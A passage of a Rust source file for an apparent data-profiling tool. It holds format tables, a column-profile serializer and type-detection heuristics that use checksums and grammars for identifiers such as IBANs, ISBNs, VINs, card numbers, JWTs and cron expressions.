    "%m/%d/%Y %I:%M:%S %p", // e.g. "01/15/2024 10:00:00 AM"
    "%m/%d/%Y %H:%M",
    "%Y-%m-%d %H:%M",
    "%Y-%m-%dT%H:%M",
    // Compact/"Basic" ISO 8601 - no punctuation at all, e.g. common in
    // generated filenames and log timestamps: "20240115T100000".
    "%Y%m%dT%H%M%S",
];

/// Candidate time-of-day formats, tried the same way DATE_FORMATS is: first
/// one every value matches wins. %.f tolerates a value with no fractional
/// seconds (verified the same way as the DATE_FORMATS entries above).
const TIME_FORMATS: &[&str] = &["%H:%M:%S%.f", "%H:%M", "%I:%M:%S %p", "%I:%M %p"];

fn matching_time_format(values: &[&str]) -> Option<&'static str> {
    TIME_FORMATS
        .iter()
        .copied()
        .find(|fmt| values.iter().all(|v| matches_date_format(v, fmt)))
}

// --- Shared intermediate representation, produced by each format's reader ---

struct ColumnInput {
    name: String,
    current_type: String,
    raw_values: Vec<String>, // non-null/non-missing values only
    total: usize,            // total rows/records, for missing % calc
    skip_heuristics: bool,   // true for nested JSON (array/object) columns
}

struct ColumnProfile {
    name: String,
    current_type: String,
    ideal_type: String,
    description: String, // always empty - intentionally left for manual fill-in
    missing_pct: f64,
    sample_values: Vec<String>,
    notes: String,
}

// Hand-rolled stand-in for `#[derive(serde::Serialize)]` - this project's
// own `serde` dependency skips the `derive` feature entirely (see
// Cargo.toml). Deliberately a manual `SerializeStruct` impl rather than
// building a `serde_json::Value`/`Map` by hand: `serde_json::Map` is
// backed by a plain `BTreeMap` unless the `preserve_order` feature is
// enabled (which would pull in `indexmap`, the wrong direction for this
// exercise), so any Value/`json!`-based construction silently re-sorts
// fields alphabetically - confirmed by hitting exactly that regression
// (name/current_type/... coming out as current_type/description/...)
// before switching to this approach. `serialize_struct` writes fields
// directly to the output in the order given here, matching the documented
// JSON shape in CLAUDE.md exactly, with no intermediate unordered map.
impl serde::Serialize for ColumnProfile {
    fn serialize<S>(&self, serializer: S) -> std::result::Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        use serde::ser::SerializeStruct;
        let mut state = serializer.serialize_struct("ColumnProfile", 7)?;
        state.serialize_field("name", &self.name)?;
        state.serialize_field("current_type", &self.current_type)?;
        state.serialize_field("ideal_type", &self.ideal_type)?;
        state.serialize_field("description", &self.description)?;
        state.serialize_field("missing_pct", &self.missing_pct)?;
        state.serialize_field("sample_values", &self.sample_values)?;
        state.serialize_field("notes", &self.notes)?;
        state.end()
    }
}

// --- Shared heuristic engine (format-agnostic, works on stringified values) ---

fn has_leading_zero(s: &str) -> bool {
    let b = s.as_bytes();
    b.len() >= 2 && b[0] == b'0' && b[1].is_ascii_digit()
}

/// Common placeholder tokens a human/tool writes in place of a real value in
/// a format with no native null (CSV/TSV/fixed-width all encode every field
/// as plain text - the "missing" case can only be an actual empty field, or
/// one of these well-established conventions, the same ones pandas'
/// `read_csv` treats as missing by default). Matched case-insensitively
/// against the trimmed field, so " NA " and "na" both count. `"\N"` is the
/// one entry here that isn't a pandas default - it's MySQL/Hive/Redshift
/// `UNLOAD`'s own literal NULL marker for text exports (`SELECT INTO
/// OUTFILE`, Hive's default text SerDe, and Redshift's `UNLOAD ... NULL AS
/// '\N'` all write it), common enough in cloud-warehouse-produced CSV/TSV
/// that it earns a place in this list on its own merits.
const MISSING_SENTINELS: &[&str] = &[
    "na", "n/a", "null", "none", "nan", "nil", "-", "--", "?", "unknown", "missing", "#n/a", "\\n",
];

fn is_missing_sentinel(s: &str) -> bool {
    MISSING_SENTINELS.contains(&s.trim().to_ascii_lowercase().as_str())
}

fn is_bool_word(s: &str) -> bool {
    matches!(
        s.to_ascii_lowercase().as_str(),
        "true" | "false" | "yes" | "no" | "y" | "n" | "on" | "off"
    )
}

fn matching_date_format(values: &[&str]) -> Option<&'static str> {
    DATE_FORMATS
        .iter()
        .copied()
        .find(|fmt| values.iter().all(|v| matches_date_format(v, fmt)))
}

/// Recognizes RFC 4122 UUID string form (8-4-4-4-12 hex digits, dashes at
/// fixed positions) - a fixed, unambiguous grammar that can't misfire the
/// way a looser pattern could.
fn is_uuid(s: &str) -> bool {
    let b = s.as_bytes();
    b.len() == 36
        && b.iter().enumerate().all(|(i, &c)| {
            if matches!(i, 8 | 13 | 18 | 23) {
                c == b'-'
            } else {
                c.is_ascii_hexdigit()
            }
        })
}

/// Crockford's Base32 alphabet (RFC-independent, but the de facto standard
/// it's named after): 0-9 and A-Z minus I/L/O/U, chosen specifically to
/// avoid visual confusion with 1/1/0/V. Decoding is case-insensitive, so
/// lowercase input is normalized before comparing.
const CROCKFORD_BASE32: &[u8] = b"0123456789ABCDEFGHJKMNPQRSTVWXYZ";

/// A ULID (Universally Unique Lexicographically Sortable Identifier): 26
/// Crockford-base32 characters encoding 128 bits (48-bit timestamp + 80
/// bits of randomness). 26 * 5 = 130 bits, 2 more than the 128 actually
/// used - those 2 extra bits live at the top of the first character, so a
/// real, non-overflowing ULID's first character can only be '0'-'7' (the
/// first 8 symbols of the alphabet), never '8' or higher. This detail is
/// widely documented in the ULID spec itself (the canonical example -
/// "01ARZ3NDEKTSV4RRFFQ69G5FAV" - starts with '0'), and a false negative
/// on it just falls back to String, the safer failure mode if this detail
/// were ever misremembered.
fn is_ulid(s: &str) -> bool {
    let b = s.as_bytes();
    b.len() == 26
        && b.iter()
            .all(|c| CROCKFORD_BASE32.contains(&c.to_ascii_uppercase()))
        && matches!(b[0].to_ascii_uppercase(), b'0'..=b'7')
}

/// A deliberately conservative email check - not RFC 5322-complete, just
/// precise enough to avoid false positives: exactly one '@', a non-empty
/// local part, no whitespace anywhere, and a domain ending in an
/// alphabetic top-level label.
fn is_email(s: &str) -> bool {
    let Some((local, domain)) = s.split_once('@') else {
        return false;
    };
    if local.is_empty() || domain.is_empty() || domain.contains('@') {
        return false;
    }
    if s.contains(char::is_whitespace) {
        return false;
    }
    let Some((_, tld)) = domain.rsplit_once('.') else {
        return false;
    };
    !domain.starts_with('.')
        && !domain.ends_with('.')
        && !tld.is_empty()
        && tld.chars().all(|c| c.is_ascii_alphabetic())
}

/// Only http(s)/ftp URLs with a non-empty, whitespace-free remainder - not a
/// full URL grammar, just enough to distinguish a real link from anything
/// else that might otherwise fall through to plain String.
fn is_url(s: &str) -> bool {
    let rest = s
        .strip_prefix("https://")
        .or_else(|| s.strip_prefix("http://"))
        .or_else(|| s.strip_prefix("ftp://"));
    matches!(rest, Some(r) if !r.is_empty() && !r.contains(char::is_whitespace))
}

fn is_ipv4(s: &str) -> bool {
    s.parse::<Ipv4Addr>().is_ok()
}

fn is_ipv6(s: &str) -> bool {
    // Ipv4Addr strings never satisfy this (Ipv6Addr::from_str requires a
    // colon), but the explicit check keeps the intent visible.
    s.contains(':') && s.parse::<Ipv6Addr>().is_ok()
}

/// "<IPv4 or IPv6 address>/<prefix length>" - reuses is_ipv4/is_ipv6
/// directly rather than a second address parser, and just adds the
/// prefix-length range check (0-32 for IPv4, 0-128 for IPv6) CIDR notation
/// itself defines.
fn is_cidr(s: &str) -> bool {
    let Some((addr, prefix_str)) = s.split_once('/') else {
        return false;
    };
    let Ok(prefix) = prefix_str.parse::<u8>() else {
        return false;
    };
    if is_ipv4(addr) {
        prefix <= 32
    } else if is_ipv6(addr) {
        prefix <= 128
    } else {
        false
    }
}

/// Normalizes a numeric-looking string by stripping formatting noise a raw
/// parse would otherwise choke on: surrounding whitespace, thousands-
/// separator commas, currency symbols ($/€/£/¥), parenthesized negatives
/// ("(123)" -> "-123", standard accounting notation), and a trailing '%'.
/// Returns the cleaned string plus whether a '%' was stripped - a
/// percentage changes the value's actual meaning (45% is not the number
/// 45), unlike currency/thousands-separator noise, so it earns its own note
/// rather than being silently folded into "numeric strings".
fn normalize_numeric_str(s: &str) -> (String, bool) {
    let trimmed = s.trim();
    let (body, parenthesized) =
        if trimmed.len() >= 2 && trimmed.starts_with('(') && trimmed.ends_with(')') {
            (trimmed[1..trimmed.len() - 1].trim(), true)
        } else {
            (trimmed, false)
        };

    let mut cleaned = body.replace([',', '$', '€', '£', '¥'], "");
    let is_percent = cleaned.ends_with('%');
    if is_percent {
        cleaned.pop();
    }
    if parenthesized && !cleaned.starts_with('-') {
        cleaned = format!("-{cleaned}");
    }
    (cleaned, is_percent)
}

/// A bare integer literal (optional single leading '-', otherwise all ASCII
/// digits) - as opposed to a decimal or exponential form. Used to detect
/// values that reach the f64 branch specifically because they overflowed
/// i64: such a value is, by construction, already too large for i64's
/// range (~9.2e18), which is itself well past f64's exact-integer range
/// (2^53, ~9e15) - so representing it as a float is guaranteed to lose
/// precision, not just risk it.
fn is_plain_integer_literal(s: &str) -> bool {
    let body = s.strip_prefix('-').unwrap_or(s);
    !body.is_empty() && body.chars().all(|c| c.is_ascii_digit())
}

fn numeric_note(current: &str, target: &str, any_percent: bool) -> String {
    let mut parts = Vec::new();
    if current != target {
        parts.push("numeric strings".to_string());
    }
    if any_percent {
        parts.push("'%' stripped from percentage values".to_string());
    }
    parts.join("; ")
}

/// Parses an explicitly base-prefixed integer literal ("0x1A", "0b1010",
/// "0o17"). The prefix is the unambiguous signal - a bare hex string with no
/// prefix (which could just as easily be a hash or an opaque ID) is
/// deliberately not matched here; see is_uuid for the same reasoning
/// applied to dashed hex.
fn parse_prefixed_int(s: &str) -> Option<i64> {
    let (rest, radix) = if let Some(r) = s.strip_prefix("0x").or_else(|| s.strip_prefix("0X")) {
        (r, 16)
    } else if let Some(r) = s.strip_prefix("0b").or_else(|| s.strip_prefix("0B")) {
        (r, 2)
    } else if let Some(r) = s.strip_prefix("0o").or_else(|| s.strip_prefix("0O")) {
        (r, 8)
    } else {
        return None;
    };
    if rest.is_empty() {
        return None;
    }
    i64::from_str_radix(rest, radix).ok()
}

/// Six colon- or dash-separated 2-hex-digit groups - the fixed IEEE 802
/// grammar, not the loose "hex-ish string" that a bare hash could also
/// satisfy. Verified separately that this shape never parses as a valid
/// Ipv6Addr (6 groups with no "::" is rejected by std's own strict parser),
/// so there's no risk of the two checks disagreeing on the same value.
fn is_mac_address(s: &str) -> bool {
    let sep = if s.contains(':') {
        ':'
    } else if s.contains('-') {
        '-'
    } else {
        return false;
    };
    let groups: Vec<&str> = s.split(sep).collect();
    groups.len() == 6
        && groups
            .iter()
            .all(|g| g.len() == 2 && g.chars().all(|c| c.is_ascii_hexdigit()))
}

/// ISO 7064 mod-97-10 IBAN checksum: move the first 4 characters to the
/// end, expand each letter to its two-digit value (A=10..Z=35), and the
/// resulting decimal number must be ≡ 1 (mod 97). Computed digit-by-digit
/// via a running remainder rather than building the (up to ~70-digit)
/// number directly, since it doesn't fit in a u64. Verified against three
/// real IBANs (GB/DE/FR, including FR's letter-containing BBAN) and one
/// deliberately-corrupted checksum before being relied on.
fn is_iban(s: &str) -> bool {
    let cleaned: String = s
        .chars()
        .filter(|c| *c != ' ')
        .collect::<String>()
        .to_ascii_uppercase();
    let len = cleaned.len();
    if !(15..=34).contains(&len) {
        return false;
    }
    let b = cleaned.as_bytes();
    if !(b[0].is_ascii_alphabetic()
        && b[1].is_ascii_alphabetic()
        && b[2].is_ascii_digit()
        && b[3].is_ascii_digit())
    {
        return false;
    }
    if !cleaned[4..].chars().all(|c| c.is_ascii_alphanumeric()) {
        return false;
    }

    let rearranged = format!("{}{}", &cleaned[4..], &cleaned[0..4]);
    let mut remainder: u64 = 0;
    for c in rearranged.chars() {
        let value = if c.is_ascii_digit() {
            u64::from(c.to_digit(10).unwrap())
        } else {
            u64::from(c as u32 - 'A' as u32) + 10
        };
        if value >= 10 {
            remainder = (remainder * 10 + value / 10) % 97;
            remainder = (remainder * 10 + value % 10) % 97;
        } else {
            remainder = (remainder * 10 + value) % 97;
        }
    }
    remainder == 1
}

/// Luhn (mod 10) checksum - used by credit card numbers among other
/// identifier schemes.
fn luhn_checksum_valid(digits: &[u32]) -> bool {
    let sum: u32 = digits
        .iter()
        .rev()
        .enumerate()
        .map(|(i, &d)| {
            if i % 2 == 1 {
                let doubled = d * 2;
                if doubled > 9 { doubled - 9 } else { doubled }
            } else {
                d
            }
        })
        .sum();
    sum.is_multiple_of(10)
}

/// A Luhn-valid digit string of plausible card length (12-19 digits, the
/// ISO/IEC 7812-1 range), tolerant of the spaces/dashes real card numbers
/// are commonly typed with. The checksum is what makes this safe: a random
/// digit string passes Luhn only 1 time in 10, so combined with the length
/// bound this is a strong signal, not a shape-only guess.
fn is_credit_card_number(s: &str) -> bool {
    let cleaned: String = s.chars().filter(|c| !matches!(c, ' ' | '-')).collect();
    if !(12..=19).contains(&cleaned.len()) || !cleaned.chars().all(|c| c.is_ascii_digit()) {
        return false;
    }
    let digits: Vec<u32> = cleaned.chars().map(|c| c.to_digit(10).unwrap()).collect();
    luhn_checksum_valid(&digits)
}

fn digits_of(s: &str) -> Option<Vec<u32>> {
    s.chars()
        .all(|c| c.is_ascii_digit())
        .then(|| s.chars().map(|c| c.to_digit(10).unwrap()).collect())
}

/// EAN-13/UPC-A/ISBN-13 check digit: all three use the same weighted mod-10
/// algorithm, since UPC-A is exactly an EAN-13 with an implicit leading
/// zero (0 contributes nothing to the weighted sum either way, so padding a
/// 12-digit UPC-A to 13 digits and applying EAN-13's rule reproduces UPC-A's
/// own rule exactly) and ISBN-13 is a 978/979-prefixed EAN-13. Digits at
/// even index (0-based) count once, odd index counts x3; the trailing
/// digit must make the total's last decimal digit 0. Hand-verified against
/// known-valid EAN-13 ("4006381333931"), UPC-A ("036000291452"), and
/// ISBN-13 ("9780306406157") numbers, plus a tampered checksum, before
/// being relied on.
fn ean_check_digit_valid(digits: &[u32]) -> bool {
    let padded: Vec<u32> = std::iter::repeat_n(0, 13 - digits.len())
        .chain(digits.iter().copied())
        .collect();
    let sum: u32 = padded[..12]
        .iter()
        .enumerate()
        .map(|(i, &d)| if i.is_multiple_of(2) { d } else { d * 3 })
        .sum();
    (10 - sum % 10) % 10 == padded[12]
}

fn is_ean_or_upc(s: &str) -> bool {
    matches!(s.len(), 12 | 13) && digits_of(s).is_some_and(|d| ean_check_digit_valid(&d))
}

fn is_isbn13(s: &str) -> bool {
    let cleaned: String = s.chars().filter(|c| *c != '-' && *c != ' ').collect();
    cleaned.len() == 13
        && (cleaned.starts_with("978") || cleaned.starts_with("979"))
        && digits_of(&cleaned).is_some_and(|d| ean_check_digit_valid(&d))
}

/// ISBN-10's own mod-11 check digit (an older, different scheme than
/// ISBN-13/EAN's): weights count down from 10 to 1 across all 10 positions
/// (the check digit itself weighted 1), total must be divisible by 11. The
/// check digit may be 'X', standing for 10. Verified against a known-valid
/// ISBN-10 ("0306406152"), a tampered one, and one with an 'X' check digit
/// ("097522980X") before being relied on.
fn is_isbn10(s: &str) -> bool {
    let cleaned: String = s.chars().filter(|c| *c != '-' && *c != ' ').collect();
    if cleaned.len() != 10 {
        return false;
    }
    let b = cleaned.as_bytes();
    if !b[..9].iter().all(u8::is_ascii_digit) {
        return false;
    }
    if !(b[9].is_ascii_digit() || b[9] == b'X' || b[9] == b'x') {
        return false;
    }
    let sum: u32 = b
        .iter()
        .enumerate()
        .map(|(i, &c)| {
            let v = if c == b'X' || c == b'x' {
                10
            } else {
                u32::from(c - b'0')
            };
            v * (10 - i as u32)
        })
        .sum();
    sum.is_multiple_of(11)
}

/// A SemVer numeric identifier: digits only, and no leading zero unless the
/// whole identifier is just "0" - the exact rule semver.org itself
/// specifies for the MAJOR/MINOR/PATCH components.
fn is_numeric_identifier(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_digit()) && (s == "0" || !s.starts_with('0'))
}

/// A reasonably faithful (not 100% spec-exhaustive) semver.org check:
/// MAJOR.MINOR.PATCH, each a leading-zero-free numeric identifier, plus an
/// optional "-prerelease" and/or "+build" suffix. Deliberately requires
/// exactly 3 dot-separated core components, so it never collides with
/// is_ipv4's 4-octet grammar - see the known-limitations note on this
/// still being ambiguous with a plain dotted numeric code that isn't
/// actually a version (the same irreducible ambiguity IPv4 already has
/// with a dotted version string).
fn is_semver(s: &str) -> bool {
    let without_build = s.split_once('+').map_or(s, |(base, _)| base);
    let (core, prerelease) = match without_build.split_once('-') {
        Some((c, p)) => (c, Some(p)),
        None => (without_build, None),
    };
    let parts: Vec<&str> = core.split('.').collect();
    parts.len() == 3
        && parts.iter().all(|p| is_numeric_identifier(p))
        && prerelease.is_none_or(|pre| {
            !pre.is_empty()
                && pre.split('.').all(|id| {
                    !id.is_empty() && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
                })
        })
}

/// True if the whole cell is itself a serialized JSON object or array - a
/// text/CSV column that's secretly holding structured data. Deliberately
/// excludes a bare scalar ("5", "true", "\"hello\"" are all technically
/// valid JSON too) since those are already handled correctly, and more
/// specifically, by the bool/numeric checks elsewhere - this check only
/// fires on the case those can't already explain.
fn is_embedded_json(s: &str) -> bool {
    matches!(
        serde_json::from_str::<JsonValue>(s),
        Ok(JsonValue::Object(_) | JsonValue::Array(_))
    )
}

/// Decodes unpadded base64url (RFC 4648 §5: '-'/'_' instead of '+'/'/', no
/// '=' padding required, though tolerated by simply stripping it first).
/// Hand-rolled rather than adding the `base64` crate as an unconditional
/// dependency of the default build - the same tradeoff already made for
/// UUID/email/URL detection elsewhere in this file.
fn base64url_decode(s: &str) -> Option<Vec<u8>> {
    fn sextet(c: u8) -> Option<u8> {
        match c {
            b'A'..=b'Z' => Some(c - b'A'),
            b'a'..=b'z' => Some(c - b'a' + 26),
            b'0'..=b'9' => Some(c - b'0' + 52),
            b'-' => Some(62),
            b'_' => Some(63),
            _ => None,
        }
    }
    let stripped: Vec<u8> = s.bytes().filter(|&b| b != b'=').collect();
    if stripped.is_empty() {
        return None;
    }
    let mut out = Vec::with_capacity(stripped.len() * 3 / 4);
    let mut buf: u32 = 0;
    let mut bits = 0u32;
    for b in stripped {
        buf = (buf << 6) | u32::from(sextet(b)?);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
        }
    }
    Some(out)
}

/// A JSON Web Token: three dot-separated base64url segments where the
/// header and payload segments must each decode to a valid JSON *object*
/// (both are defined by RFC 7519 to always be objects - the header at
/// minimum carries "alg", the payload carries the claims) - a much
/// stronger signal than just "three base64-ish segments", since it
/// requires the decoded bytes to actually be valid UTF-8 JSON, not merely
/// valid base64url. The third (signature) segment is arbitrary bytes by
/// design, so it's only checked for a valid base64url charset, not decoded
/// content. Verified against jwt.io's own canonical example token before
/// being relied on.
fn is_jwt(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 3 || parts.iter().any(|p| p.is_empty()) {
        return false;
    }
    for part in &parts[..2] {
        let Some(bytes) = base64url_decode(part) else {
            return false;
        };
        let Ok(text) = std::str::from_utf8(&bytes) else {
            return false;
        };
        match serde_json::from_str::<JsonValue>(text) {
            Ok(JsonValue::Object(_)) => {}
            _ => return false,
        }
    }
    base64url_decode(parts[2]).is_some()
}

// GEOMETRYCOLLECTION is deliberately excluded: unlike the other six, its
// parenthesized body legitimately nests *other* geometry keywords
// ("GEOMETRYCOLLECTION(POINT(4 6))"), not just coordinate characters - this
// was found empirically (a real fixture value with GEOMETRYCOLLECTION
// caused the whole test column to fail the coordinate-only character check
// below). Properly supporting it needs actual recursive parsing, a
// meaningfully bigger scope than "keyword + balanced coordinate body" - so
// rather than either overclaim support that silently breaks on nesting, or
// loosen the character check for everyone (raising false-positive risk for
// the other six), it's just left out. A GEOMETRYCOLLECTION value falls back
// to String, the safe direction.
const WKT_KEYWORDS: &[&str] = &[
    "POINT",
    "LINESTRING",
    "POLYGON",
    "MULTIPOINT",
    "MULTILINESTRING",
    "MULTIPOLYGON",
];

/// A Well-Known Text geometry: one of the standard OGC keywords, followed
/// by a parenthesized, balanced coordinate group. Deliberately structural
/// rather than a full WKT parser - it doesn't validate that the coordinate
/// content actually forms a well-formed ring/point-count for its geometry
/// type, just that the keyword is real and the parenthesized body is
/// balanced and contains only characters a coordinate list could contain
/// (digits, '.', '-', ',', space, nested parens for POLYGON's rings). Not
/// standards-complete in the same spirit as is_email/is_url elsewhere in
/// this file - a false negative just falls back to String.
fn is_wkt_geometry(s: &str) -> bool {
    let trimmed = s.trim();
    let keyword_end = trimmed
        .find(|c: char| !c.is_ascii_alphabetic())
        .unwrap_or(trimmed.len());
    let keyword = &trimmed[..keyword_end];
    if !WKT_KEYWORDS.iter().any(|k| k.eq_ignore_ascii_case(keyword)) {
        return false;
    }
    let rest = trimmed[keyword_end..].trim_start();
    if !rest.starts_with('(') || !rest.ends_with(')') {
        return false;
    }
    let mut depth = 0i32;
    for c in rest.chars() {
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth < 0 {
                    return false;
                }
            }
            '0'..='9' | '.' | '-' | ',' | ' ' => {}
            _ => return false,
        }
    }
    depth == 0
}

/// A "lat,lon" single-cell coordinate pair. Deliberately the most
/// conservative check in this file: unlike a checksum or a fixed-prefix
/// grammar, there's no unambiguous signal distinguishing a real coordinate
/// from any other pair of small decimals - "1.5,2.5" is structurally
/// identical to a genuine coordinate. Requiring a decimal point in *both*
/// components (real coordinate data essentially always carries fractional
/// precision) plus the standard ±90/±180 range rules out plain integer
/// pairs and out-of-range values, but doesn't eliminate the ambiguity -
/// see the design-philosophy note below for why this tradeoff was made
/// anyway, with the residual risk documented rather than hidden.
fn is_lat_lon_pair(s: &str) -> bool {
    let Some((lat_str, lon_str)) = s.split_once(',') else {
        return false;
    };
    let (lat_str, lon_str) = (lat_str.trim(), lon_str.trim());
    if !lat_str.contains('.') || !lon_str.contains('.') {
        return false;
    }
    let Ok(lat) = lat_str.parse::<f64>() else {
        return false;
    };
    let Ok(lon) = lon_str.parse::<f64>() else {
        return false;
    };
    (-90.0..=90.0).contains(&lat) && (-180.0..=180.0).contains(&lon)
}

/// One comma-separated cron field part: '*', a bare number, a range
/// "N-M", or a step on either of those ("*/N" or "N-M/N"). A step's base
/// must be '*' or a range - cron itself doesn't define what "5/3" would
/// even mean for a bare number, so that's rejected rather than guessed at.
fn is_cron_field_part(part: &str, min: u32, max: u32) -> bool {
    let (base, step) = match part.split_once('/') {
        Some((b, s)) => {
            let Ok(step_n) = s.parse::<u32>() else {
                return false;
            };
            if step_n == 0 {
                return false;
            }
            (b, Some(step_n))
        }
        None => (part, None),
    };
    let range_ok = if base == "*" {
        true
    } else if let Some((lo, hi)) = base.split_once('-') {
        let (Ok(lo), Ok(hi)) = (lo.parse::<u32>(), hi.parse::<u32>()) else {
            return false;
        };
        lo <= hi && lo >= min && hi <= max
    } else if let Ok(n) = base.parse::<u32>() {
        (min..=max).contains(&n)
    } else {
        false
    };
    range_ok && (step.is_none() || base == "*" || base.contains('-'))
}

fn is_cron_field(field: &str, min: u32, max: u32) -> bool {
    field
        .split(',')
        .all(|part| is_cron_field_part(part, min, max))
}

/// A standard 5-field cron expression: minute(0-59) hour(0-23)
/// day-of-month(1-31) month(1-12) day-of-week(0-7, both 0 and 7 mean
/// Sunday). Each field may be '*', a number, a comma-separated list, a
/// range "N-M", or a step "*/N"/"N-M/N". Deliberately does not support
/// named months/weekdays (JAN, MON, ...) - kept to the numeric grammar
/// most cron implementations share, rather than a larger, harder-to-verify
/// keyword table. Carries a real, disclosed ambiguity like
/// is_lat_lon_pair/is_semver do: five arbitrary small integers in range
/// ("1 2 3 4 5") are indistinguishable from a real cron schedule - there's
/// no checksum or prefix here either.
fn is_cron_expression(s: &str) -> bool {
    let fields: Vec<&str> = s.split_whitespace().collect();
    if fields.len() != 5 {
        return false;
    }
    const RANGES: [(u32, u32); 5] = [(0, 59), (0, 23), (1, 31), (1, 12), (0, 7)];
    fields
        .iter()
        .zip(RANGES)
        .all(|(f, (min, max))| is_cron_field(f, min, max))
}

/// Classifies a value by hex-digest length alone (MD5=32, SHA-1=40,
/// SHA-256=64 hex characters). Deliberately NOT promoted to its own
/// ideal_type the way UUID/IMEI/etc. are - there's no checksum or prefix
/// to verify against, so a bare hex string of one of these lengths is
/// exactly as likely to be an unrelated hex-encoded ID as a real digest
/// (in fact a bare, undashed UUID is exactly 32 hex characters too). Only
/// ever surfaced as a note on an otherwise-plain String column - see where
/// it's used in suggest_ideal_type for why.
fn hash_digest_kind(s: &str) -> Option<&'static str> {
    if s.is_empty() || !s.chars().all(|c| c.is_ascii_hexdigit()) {
        return None;
    }
    match s.len() {
        32 => Some("MD5"),
        40 => Some("SHA-1"),
        64 => Some("SHA-256"),
        _ => None,
    }
}

/// '#' followed by exactly 3 (RGB), 4 (RGBA), 6 (RRGGBB), or 8 (RRGGBBAA)
/// hex digits - the '#' prefix is the unambiguous signal, the same role
/// "0x" plays for parse_prefixed_int.
fn is_hex_color(s: &str) -> bool {
    s.strip_prefix('#').is_some_and(|rest| {
        matches!(rest.len(), 3 | 4 | 6 | 8) && rest.chars().all(|c| c.is_ascii_hexdigit())
    })
}

/// 15-digit mobile device identifier - IMEI uses the exact same Luhn (mod
/// 10) checksum as a credit card number, just at a fixed 15-digit length,
/// so this reuses luhn_checksum_valid directly rather than a second
/// implementation. Verified against a well-known real IMEI ("490154203237518",
/// widely used as the reference example in Luhn-algorithm documentation)
/// plus a tampered counterpart.
fn is_imei(s: &str) -> bool {
    s.len() == 15 && digits_of(s).is_some_and(|d| luhn_checksum_valid(&d))
}

/// NHTSA's VIN letter-to-digit transliteration table (ISO 3779-derived,
/// used for the North American check-digit calculation). I/O/Q are never
/// valid VIN characters at all (excluded from the standard to avoid
/// confusion with 1/0), so they correctly fall through to None here rather
/// than needing special-casing.
fn vin_char_value(c: u8) -> Option<u32> {
    Some(match c {
        b'0'..=b'9' => u32::from(c - b'0'),
        b'A' => 1,
        b'B' => 2,
        b'C' => 3,
        b'D' => 4,
        b'E' => 5,
        b'F' => 6,
        b'G' => 7,
        b'H' => 8,
        b'J' => 1,
        b'K' => 2,
        b'L' => 3,
        b'M' => 4,
        b'N' => 5,
        b'P' => 7,
        b'R' => 9,
        b'S' => 2,
        b'T' => 3,
        b'U' => 4,
        b'V' => 5,
        b'W' => 6,
        b'X' => 7,
        b'Y' => 8,
        b'Z' => 9,
        _ => return None,
    })
}

const VIN_WEIGHTS: [u32; 17] = [8, 7, 6, 5, 4, 3, 2, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2];

/// The North American VIN check-digit scheme: each of the 17 characters'
/// transliterated value times its position weight, summed and reduced
/// mod 11 - the result must equal position 9's own character (as a digit,
/// or 'X' for a remainder of 10; position 9 IS the check digit, which is
/// why its own weight is 0 - it contributes nothing to the sum it's being
/// checked against). Verified by hand (recomputed independently, not just
/// trusted from this function's own output) against the canonical
/// reference VIN "1HGCM82633A004352" used throughout VIN-checksum
/// documentation, plus a tampered counterpart - see CLAUDE.md for why this
/// gets a smaller verification set than IBAN/ISBN's multiple independent
/// real numbers.
fn is_vin(s: &str) -> bool {
    let b = s.as_bytes();
    if b.len() != 17 {
        return false;
    }
    let mut sum = 0u32;
    for (i, &c) in b.iter().enumerate() {
        let Some(v) = vin_char_value(c) else {
            return false;
        };
        sum += v * VIN_WEIGHTS[i];
    }
    let remainder = sum % 11;
    let expected = if remainder == 10 {
        b'X'
    } else {
        b'0' + remainder as u8
    };
    b[8] == expected
}

/// The core type-detection heuristic: given a column's raw string values
/// and its declared "current" type, returns an `(ideal_type, notes)` pair.
/// Public specifically so `benches/heuristic_engine.rs` can call it
/// directly (in-process, no subprocess/I/O noise) - this is the one
/// function in the crate's otherwise-private internals exposed for that
/// reason alone, not as a general-purpose library API (`run()` remains the
/// only supported entry point for actual use).
pub fn suggest_ideal_type(values: &[&str], current: &str) -> (String, String) {
    // Precise, unambiguous grammars are checked first - each one fully
    // explains the whole string, so there's no risk of a cruder check
    // (leading-zero, in particular) firing on a substring pattern instead.
    if values.iter().all(|v| is_hex_color(v)) {
        return (
            "Hex Color".to_string(),
            "matches #RGB/#RGBA/#RRGGBB/#RRGGBBAA hex color format".to_string(),
        );
    }
    if values.iter().all(|v| is_mac_address(v)) {
        return (
            "MAC Address".to_string(),
            "matches MAC address format".to_string(),
        );
    }
    if values.iter().all(|v| is_iban(v)) {
        return (
            "IBAN".to_string(),
            "matches IBAN format (mod-97 checksum valid)".to_string(),
        );
    }
    // ISBN/EAN/UPC/IMEI/VIN are all checked ahead of the broader-range
    // credit card check below: they only match an exact 10, 12, 13, 15, or
    // 17-character length, so the more narrowly-scoped match should win a
    // tie (a 13-digit number can in principle satisfy both a card issuer's
    // Luhn check and EAN-13's own mod-10 check by coincidence - genuinely
    // undecidable from the digits alone without domain context, the same
    // kind of irreducible ambiguity as a dotted-quad value being valid as
    // both IPv4 and a version string; a VIN containing only digits, which
    // the standard doesn't strictly forbid though real ones never do this,
    // is the same story at 17 characters).
    if values.iter().all(|v| is_isbn10(v)) {
        return (
            "ISBN-10".to_string(),
            "matches ISBN-10 format (mod-11 checksum valid)".to_string(),
        );
    }
    if values.iter().all(|v| is_isbn13(v)) {
        return (
            "ISBN-13".to_string(),
            "matches ISBN-13 format (978/979 prefix, EAN-13 checksum valid)".to_string(),
        );
    }
    if values.iter().all(|v| is_ean_or_upc(v)) {
        return (
            "EAN-13 / UPC-A".to_string(),
            "matches EAN-13/UPC-A barcode format (checksum valid)".to_string(),
        );
    }
    if values.iter().all(|v| is_imei(v)) {
        return (
            "IMEI".to_string(),
            "matches IMEI format (15 digits, Luhn checksum valid)".to_string(),
        );
    }
    if values.iter().all(|v| is_vin(v)) {
        return (
            "VIN".to_string(),
            "matches Vehicle Identification Number format (mod-11 checksum valid)".to_string(),
        );
    }
    if values.iter().all(|v| is_credit_card_number(v)) {
        return (
            "Credit Card Number".to_string(),
            "matches card number format (Luhn checksum valid)".to_string(),
        );
    }
    if values.iter().all(|v| is_uuid(v)) {
